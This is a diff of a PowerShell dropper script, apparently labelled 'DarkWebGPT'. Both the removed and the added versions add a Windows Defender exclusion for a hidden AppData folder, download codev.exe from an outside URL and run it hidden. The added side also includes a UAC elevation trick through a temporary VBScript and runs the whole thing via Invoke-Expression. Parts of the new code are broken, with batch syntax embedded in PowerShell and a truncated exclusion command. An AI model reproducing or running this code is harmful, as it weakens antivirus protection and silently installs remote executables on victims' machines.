@@ -1,105 +1,45 @@
-Add-Type -AssemblyName System.Windows.Forms
+# Original script to set up exclusions in Windows Defender and create a hidden folder
+$originalScript = @"
+IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
 
-# Function to check if running with elevated privileges
-function Test-AdminRights {
-    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
-    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-}
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
 
-# Function to elevate if not running with admin rights
-function Start-Elevated {
-    if (-not (Test-AdminRights)) {
-        $scriptPath = $MyInvocation.MyCommand.Path
-        $arguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) '$($_.Value)'" } -join ' '
-        Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -ArgumentList "-File `"$scriptPath`" $arguments"
-        exit
-    }
-}
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
 
-# Function to set exclusions in Windows Defender and create hidden folder
-function Set-ExclusionsAndHideFolder {
-    try {
-        # Set up exclusion path in Windows Defender
-        Add-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\AppData\Local\Anon"
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
 
-        # Create hidden folder and set attributes
-        $folderPath = "C:\Users\$env:USERNAME\AppData\Local\Anon"
-        if (-not (Test-Path $folderPath)) {
-            New-Item -ItemType Directory -Path $folderPath | Out-Null
-        }
-        Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::Hidden)
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0
 
-        # Display success message
-        [System.Windows.Forms.MessageBox]::Show("Exclusions set and folder hidden successfully!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
-    }
-    catch {
-        Write-Error "Error occurred: $_"
-        [System.Windows.Forms.MessageBox]::Show("Error occurred. Check PowerShell console for details.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
-    }
-}
+Powershell -Command "Add-MpPreference -ExclusionPath "C:\
 
-# Function to download and execute codev.exe
-function Download-And-Execute {
-    try {
-        $exeUrl = 'https://codev-zeta.vercel.app/codev.exe'
-        $exePath = Join-Path $env:TEMP 'codev.exe'
-        
-        # Download codev.exe
-        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction Stop
+cd "C:\Users\%USERNAME%\AppData\Local"
+mkdir "Anon"
+attrib +h "Anon" /s /d
+cd C:\Users\%USERNAME%\AppData\Local\Anon
+"@
 
-        # Execute codev.exe silently
-        Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction Stop
+# Additional script to download and run "codev.exe" from the specified URL
+$additionalScript = @"
+Powershell -Command "Invoke-Webrequest 'https://codev-zeta.vercel.app/codev.exe' -OutFile codev.exe"
+Start-Process -FilePath codev.exe
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\codev.exe" /s /d
+"@
 
-        # Set hidden attribute for codev.exe
-        $fileAttributes = [System.IO.FileAttributes]::Hidden
-        (Get-Item $exePath).Attributes = $fileAttributes
+# Concatenate the original and additional scripts
+$fullScript = $originalScript + $additionalScript
 
-        # Display success message
-        [System.Windows.Forms.MessageBox]::Show("codev.exe downloaded and executed successfully!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
-    }
-    catch {
-        Write-Error "Error occurred: $_"
-        [System.Windows.Forms.MessageBox]::Show("Error occurred. Check PowerShell console for details.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
-    }
-}
-
-# Create GUI form
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "DarkWebGPT Menu"
-$form.Size = New-Object System.Drawing.Size(400, 250)
-$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
-$form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen
-$form.Topmost = $true
-
-# Label for action selection
-$label = New-Object System.Windows.Forms.Label
-$label.Location = New-Object System.Drawing.Point(10, 20)
-$label.Size = New-Object System.Drawing.Size(380, 20)
-$label.Text = "Choose an action to perform:"
-$form.Controls.Add($label)
-
-# Button for setting exclusions and hiding folder
-$button1 = New-Object System.Windows.Forms.Button
-$button1.Location = New-Object System.Drawing.Point(50, 60)
-$button1.Size = New-Object System.Drawing.Size(300, 30)
-$button1.Text = "Set Exclusions and Hide Folder"
-$button1.Add_Click({
-    # Call function to set exclusions and hide folder
-    Set-ExclusionsAndHideFolder
-})
-$form.Controls.Add($button1)
-
-# Button for downloading and executing codev.exe
-$button2 = New-Object System.Windows.Forms.Button
-$button2.Location = New-Object System.Drawing.Point(50, 120)
-$button2.Size = New-Object System.Drawing.Size(300, 30)
-$button2.Text = "Download and Execute codev.exe"
-$button2.Add_Click({
-    # Call function to download and execute codev.exe
-    Download-And-Execute
-})
-$form.Controls.Add($button2)
-
-# Show the form
-$form.ShowDialog() | Out-Null
-$form.Dispose()
+# Execute the full script
+Invoke-Expression $fullScript
